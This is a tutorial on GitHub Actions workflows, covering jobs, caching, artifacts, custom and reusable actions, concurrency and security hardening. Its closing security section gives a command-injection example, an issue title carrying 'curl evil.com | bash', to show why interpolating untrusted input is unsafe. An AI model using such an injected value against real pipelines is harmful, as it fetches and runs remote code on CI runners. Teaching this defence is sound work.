GitHub Actions building blocks

Every workflow is made of the same fundamental pieces. Understanding them is the key to mastering GitHub Actions.

{`┌─────────────────────────────────────────────────┐ │ WORKFLOW (.yml file) │ │ │ │ ┌──────────────────┐ ┌──────────────────┐ │ │ │ JOB 1 │ │ JOB 2 │ │ │ │ (runs on VM 1) │──▶│ (runs on VM 2) │ │ │ │ │ │ │ │ │ │ ┌─────────────┐ │ │ ┌─────────────┐ │ │ │ │ │ Step 1 │ │ │ │ Step 1 │ │ │ │ │ │ (checkout) │ │ │ │ (deploy) │ │ │ │ │ └──────┬──────┘ │ │ └─────────────┘ │ │ │ │ ┌──────▼──────┐ │ │ │ │ │ │ │ Step 2 │ │ └──────────────────┘ │ │ │ │ (run tests) │ │ │ │ │ └──────┬──────┘ │ EVENT TRIGGER │ │ │ ┌──────▼──────┐ │ (push, PR, schedule, │ │ │ │ Step 3 │ │ manual, webhook) │ │ │ │ (lint) │ │ │ │ │ └─────────────┘ │ │ │ └──────────────────┘ │ └─────────────────────────────────────────────────┘`}

The hierarchy explained

Workflow: A configurable automated process defined in a YAML file. A repo can have many workflows, each triggered by different events.

Job: A set of steps that execute on the same runner (virtual machine). Jobs run in parallel by default. You can make them sequential with needs:.

Step: An individual task within a job. Each step either runs a shell command (run:) or uses a pre-built action (uses:). Steps always run sequentially within a job.

Action: A reusable unit of code. Can be from the GitHub Marketplace, your own repo, or a Docker container.

Runner: The server that runs your workflows. GitHub provides hosted runners (Ubuntu, Windows, macOS) or you can self-host your own.

Jobs get their own fresh virtual machine — they share nothing by default. Steps within a job share the same filesystem and environment. This means if Step 1 installs Python packages, Step 2 can use them, but Job 2 cannot.

Complete anatomy of a workflow file

{`# ────────────────────────────────────────────────── # LEVEL 1: Workflow metadata # ────────────────────────────────────────────────── name: Python CI Pipeline # Shows in the Actions tab UI # ────────────────────────────────────────────────── # LEVEL 2: Event triggers — WHEN does this run? # ────────────────────────────────────────────────── on: push: branches: [main, develop] pull_request: branches: [main] # ────────────────────────────────────────────────── # LEVEL 3: Environment variables (available to all jobs) # ────────────────────────────────────────────────── env: PYTHON_VERSION: "3.11" APP_NAME: "my-python-app" # ────────────────────────────────────────────────── # LEVEL 4: Jobs — WHAT runs? # ────────────────────────────────────────────────── jobs: test: # Job ID name: Run tests # Display name runs-on: ubuntu-latest # Runner type steps: # Step using a pre-built action - name: Checkout code uses: actions/checkout@v4 # Step using a pre-built action with inputs - name: Set up Python uses: actions/setup-python@v5 with: python-version: \${{ env.PYTHON_VERSION }} # Step running shell commands - name: Install dependencies run: | python -m pip install --upgrade pip pip install -r requirements.txt # Step running tests - name: Run pytest run: pytest test_app.py -v --tb=short`}

{`jobs: build: runs-on: ubuntu-latest # Declare job-level outputs (for other jobs to consume) outputs: version: \${{ steps.extract.outputs.version }} image_tag: \${{ steps.tag.outputs.image_tag }} steps: - uses: actions/checkout@v4 # Step 1: Extract version from code - name: Extract version id: extract # ID is required to reference outputs run: | VERSION=\$(python -c " import re with open('app.py') as f: match = re.search(r'version.*([0-9]+\\.[0-9]+\\.[0-9]+)', f.read()) print(match.group(1) if match else '0.0.0') ") echo "version=\$VERSION" >> \$GITHUB_OUTPUT echo "Extracted version: \$VERSION" # Step 2: Use the output from step 1 - name: Create image tag id: tag run: | TAG="\${{ steps.extract.outputs.version }}-\${{ github.sha }}" echo "image_tag=\$TAG" >> \$GITHUB_OUTPUT echo "Image tag: \$TAG" # Step 3: Use both - name: Build with tag run: | echo "Building version \${{ steps.extract.outputs.version }}" echo "Full tag: \${{ steps.tag.outputs.image_tag }}" # Second job consuming outputs from the build job deploy: needs: build runs-on: ubuntu-latest steps: - name: Deploy version run: | echo "Deploying v\${{ needs.build.outputs.version }}" echo "Image: \${{ needs.build.outputs.image_tag }}"`}

Sharing data: caching & artifacts

Caching speeds up workflows by reusing files between runs. Artifacts persist files after a workflow completes for download or use by other jobs.

Caching dependencies

{`jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 # ── Method 1: Built-in cache in setup-python ── - uses: actions/setup-python@v5 with: python-version: "3.11" cache: "pip" # Automatically caches pip packages cache-dependency-path: | requirements.txt requirements-dev.txt # ── Method 2: Explicit cache action (more control) ── - name: Cache pip packages uses: actions/cache@v3 id: pip-cache with: path: | ~/.cache/pip .venv # Cache key: changes when requirements change key: pip-\${{ runner.os }}-\${{ hashFiles('**/requirements*.txt') }} # Fallback keys: use older cache if exact match not found restore-keys: | pip-\${{ runner.os }}- - name: Install dependencies if: steps.pip-cache.outputs.cache-hit != 'true' run: | python -m venv .venv source .venv/bin/activate pip install -r requirements.txt - run: | source .venv/bin/activate pytest test_app.py -v`}

Workflow artifacts

{`jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - uses: actions/setup-python@v5 with: python-version: "3.11" - run: pip install -r requirements.txt # Generate test coverage report - name: Run tests with coverage run: | pytest test_app.py --cov=. --cov-report=html --cov-report=xml -v # Upload coverage as artifact (available for 90 days by default) - name: Upload coverage report uses: actions/upload-artifact@v4 with: name: coverage-report path: | htmlcov/ coverage.xml retention-days: 30 # Keep for 30 days # Build and save Docker image as artifact - name: Build Docker image run: | docker build -t myapp:\${{ github.sha }} . docker save myapp:\${{ github.sha }} > myapp-image.tar - name: Upload Docker image uses: actions/upload-artifact@v4 with: name: docker-image path: myapp-image.tar compression-level: 6 # 0=none, 9=max compression deploy: needs: build runs-on: ubuntu-latest steps: # Download the Docker image from previous job - name: Download Docker image uses: actions/download-artifact@v4 with: name: docker-image - name: Load and deploy run: | docker load < myapp-image.tar echo "Deploying image myapp:\${{ github.sha }}" report: needs: build runs-on: ubuntu-latest steps: - name: Download coverage uses: actions/download-artifact@v4 with: name: coverage-report path: ./coverage - run: ls -la coverage/`} Cache: Speeds up workflows by reusing files between runs (same workflow). Auto-evicted after 7 days. Use for dependencies (pip, npm, etc.). Artifacts: Persist files after workflow completes. Can be downloaded from UI. Use for build outputs, test reports, Docker images.

Developing custom actions from scratch

When marketplace actions don't fit your needs, build your own. There are three types: JavaScript, composite, and Docker container actions.

Type 1: Composite action (easiest)

Composite actions combine multiple steps into a reusable unit using only YAML — no programming required.

{`name: "Python Setup & Test" description: "Sets up Python, installs deps, and runs tests" author: "Your Name" inputs: python-version: description: "Python version to use" required: false default: "3.11" requirements-file: description: "Path to requirements file" required: false default: "requirements.txt" test-path: description: "Path to test files" required: false default: "." outputs: test-result: description: "Test pass/fail status" value: \${{ steps.test.outputs.result }} coverage-pct: description: "Code coverage percentage" value: \${{ steps.test.outputs.coverage }} runs: using: "composite" # This makes it a composite action steps: - name: Set up Python uses: actions/setup-python@v5 with: python-version: \${{ inputs.python-version }} cache: "pip" - name: Install dependencies shell: bash # Required for composite action run steps run: | python -m pip install --upgrade pip pip install -r \${{ inputs.requirements-file }} pip install pytest pytest-cov - name: Run tests id: test shell: bash run: | if pytest \${{ inputs.test-path }} --cov --cov-report=term -v; then echo "result=success" >> \$GITHUB_OUTPUT else echo "result=failure" >> \$GITHUB_OUTPUT exit 1 fi COV=\$(pytest --cov --cov-report=term \${{ inputs.test-path }} 2>/dev/null | grep TOTAL | awk '{print \$NF}') echo "coverage=\$COV" >> \$GITHUB_OUTPUT`} {`jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - name: Setup and test id: test uses: ./.github/actions/python-setup # Local path reference with: python-version: "3.12" test-path: "tests/" - name: Check results run: | echo "Tests: \${{ steps.test.outputs.test-result }}" echo "Coverage: \${{ steps.test.outputs.coverage-pct }}"`}

Type 2: Docker container action

{`name: "Python Security Scanner" description: "Runs safety + bandit security analysis" inputs: severity: description: "Minimum severity level" required: false default: "medium" outputs: vulnerabilities: description: "Number of vulnerabilities found" runs: using: "docker" image: "Dockerfile" args: - \${{ inputs.severity }}`} {`FROM python:3.11-slim RUN pip install safety bandit COPY entrypoint.sh /entrypoint.sh RUN chmod +x /entrypoint.sh ENTRYPOINT ["/entrypoint.sh"]`} {`#!/bin/bash set -e SEVERITY=\${1:-medium} VULN_COUNT=0 echo "🔍 Running security scan (severity: \$SEVERITY)..." # Run safety check echo "--- Dependency vulnerabilities ---" if ! safety check -r requirements.txt 2>/dev/null; then VULN_COUNT=\$((VULN_COUNT + 1)) fi # Run bandit echo "--- Code security analysis ---" BANDIT_RESULTS=\$(bandit -r . -ll -f json 2>/dev/null || true) CODE_ISSUES=\$(echo "\$BANDIT_RESULTS" | python3 -c " import sys, json data = json.load(sys.stdin) print(len(data.get('results', []))) " 2>/dev/null || echo "0") VULN_COUNT=\$((VULN_COUNT + CODE_ISSUES)) echo "vulnerabilities=\$VULN_COUNT" >> \$GITHUB_OUTPUT if [ "\$VULN_COUNT" -gt 0 ]; then echo "⚠️ Found \$VULN_COUNT issue(s)" exit 1 fi echo "✅ No vulnerabilities found"`}

Creating reusable workflows

Reusable workflows let you define an entire workflow once and call it from other workflows — like functions for CI/CD. This is different from composite actions: reusable workflows contain complete jobs, while actions contain steps.

{`# ── The REUSABLE workflow (callee) ── name: Reusable Python CI on: workflow_call: # This makes it callable inputs: python-version: description: "Python version" required: false type: string default: "3.11" run-security-scan: description: "Include security scanning" required: false type: boolean default: true environment: description: "Target environment" required: false type: string default: "staging" secrets: deploy-token: description: "Deployment token" required: true outputs: test-result: description: "Test outcome" value: \${{ jobs.test.outputs.result }} image-tag: description: "Built image tag" value: \${{ jobs.build.outputs.tag }} jobs: test: runs-on: ubuntu-latest outputs: result: \${{ steps.test.outputs.result }} steps: - uses: actions/checkout@v4 - uses: actions/setup-python@v5 with: python-version: \${{ inputs.python-version }} cache: "pip" - run: pip install -r requirements.txt - id: test run: | pytest test_app.py -v && echo "result=pass" >> \$GITHUB_OUTPUT || echo "result=fail" >> \$GITHUB_OUTPUT security: if: inputs.run-security-scan runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - run: pip install safety bandit - run: safety check -r requirements.txt - run: bandit -r . -ll build: needs: [test] runs-on: ubuntu-latest outputs: tag: \${{ steps.meta.outputs.tag }} steps: - uses: actions/checkout@v4 - id: meta run: echo "tag=\${{ github.sha }}" >> \$GITHUB_OUTPUT - run: docker build -t myapp:\${{ github.sha }} .`} {`# ── The CALLER workflow ── name: Deploy Pipeline on: push: branches: [main] jobs: # Call the reusable workflow ci: uses: ./.github/workflows/reusable-python-ci.yml # Same repo # Or from another repo: # uses: myorg/shared-workflows/.github/workflows/python-ci.yml@main with: python-version: "3.12" run-security-scan: true environment: "production" secrets: deploy-token: \${{ secrets.DEPLOY_TOKEN }} # Use outputs from the reusable workflow post-ci: needs: ci runs-on: ubuntu-latest steps: - run: | echo "Test result: \${{ needs.ci.outputs.test-result }}" echo "Image tag: \${{ needs.ci.outputs.image-tag }}"`} Custom actions: Reusable steps. Run within a job. Good for: setup tasks, notifications, single operations. Reusable workflows: Reusable jobs. Run as a complete workflow. Good for: entire CI pipelines, standardized company workflows.

Managing concurrency

Concurrency controls prevent multiple workflow runs from conflicting with each other — especially critical for deployments.

{`# ── Strategy 1: Cancel outdated runs ── # When you push 3 commits quickly, only the latest runs name: CI with Concurrency on: [push, pull_request] concurrency: # Group by branch name — each branch gets one concurrent run group: ci-\${{ github.ref }} cancel-in-progress: true # Cancel older runs in same group jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - run: pytest test_app.py -v # ── Strategy 2: Queue deployments (don't cancel) ── name: Deploy on: push: branches: [main] concurrency: group: deploy-production # Only one deploy at a time cancel-in-progress: false # Queue, don't cancel jobs: deploy: runs-on: ubuntu-latest steps: - run: echo "Deploying..." # ── Strategy 3: Per-PR concurrency ── name: PR Checks on: pull_request: concurrency: # Each PR gets its own concurrency group group: pr-\${{ github.event.pull_request.number }} cancel-in-progress: true # New push to PR cancels old run jobs: test: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - run: pytest -v # ── Strategy 4: Job-level concurrency ── name: Mixed Pipeline on: push: branches: [main] jobs: test: runs-on: ubuntu-latest # Tests can run concurrently — no concurrency limit steps: - uses: actions/checkout@v4 - run: pytest -v deploy: needs: test runs-on: ubuntu-latest # But deploys are serialized concurrency: group: deploy-\${{ github.ref }} cancel-in-progress: false steps: - run: echo "Deploy is serialized"`} Always use cancel-in-progress: false for deployment jobs. Cancelling a mid-flight deployment can leave your infrastructure in a broken state. Queue them instead.

Workflow security

Security in GitHub Actions is critical. A compromised workflow can leak secrets, modify code, or attack your infrastructure. Here's how to lock things down.

Permissions: principle of least privilege

{`# ── Set restrictive defaults at workflow level ── permissions: contents: read # Default: read-only repo access # Override per-job as needed jobs: test: runs-on: ubuntu-latest # Inherits workflow permissions (contents: read) steps: - uses: actions/checkout@v4 - run: pytest test_app.py -v publish: runs-on: ubuntu-latest permissions: contents: read packages: write # Only this job can push packages steps: - uses: actions/checkout@v4 - run: echo "Publishing..." create-release: runs-on: ubuntu-latest permissions: contents: write # Needed to create releases steps: - run: echo "Creating release..."`}

Security best practices

{`name: Secure Pipeline on: pull_request: branches: [main] permissions: contents: read jobs: security-checks: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 # 1. Pin actions to SHA (not tags) - uses: actions/setup-python@65d7f2d534ac1bc67fcd62888c5f4f3d2cb2b236 with: python-version: "3.11" # 2. Never echo secrets or use them in URLs - name: Use secrets safely env: API_KEY: \${{ secrets.API_KEY }} run: | # GOOD: Use env var curl -H "Authorization: Bearer \$API_KEY" https://api.example.com # BAD (never do this): # curl https://api.example.com?key=\${{ secrets.API_KEY }} # 3. Validate PR author for sensitive operations - name: Check actor if: github.actor != 'dependabot[bot]' run: echo "Running security-sensitive step" # 4. Scan dependencies - run: pip install safety && safety check -r requirements.txt # 5. Static security analysis - run: pip install bandit && bandit -r . -ll -f json -o report.json || true # 6. Check for leaked secrets in code - uses: trufflesecurity/trufflehog@main with: extra_args: --only-verified # 7. Supply chain security: verify dependency integrity - name: Verify checksums run: pip install --require-hashes -r requirements.txt`}

Critical security rules

1. Never use pull_request_target with actions/checkout@v4 on the PR branch — it gives PR authors access to your secrets. 2. Never interpolate untrusted input directly: {'run: echo "${{ github.event.issue.title }}"'} allows command injection. Use an env var instead. 3. Never use @main or @master for third-party actions in production. 4. Never print secrets in logs, even for debugging. {`# ❌ VULNERABLE: Direct interpolation of user input - run: echo "\${{ github.event.issue.title }}" # If title is: "test"; curl evil.com | bash; echo " # It becomes: echo "test"; curl evil.com | bash; echo "" # ✅ SAFE: Use environment variable - env: ISSUE_TITLE: \${{ github.event.issue.title }} run: echo "\$ISSUE_TITLE" # The value is passed as a string, not interpreted as code`}
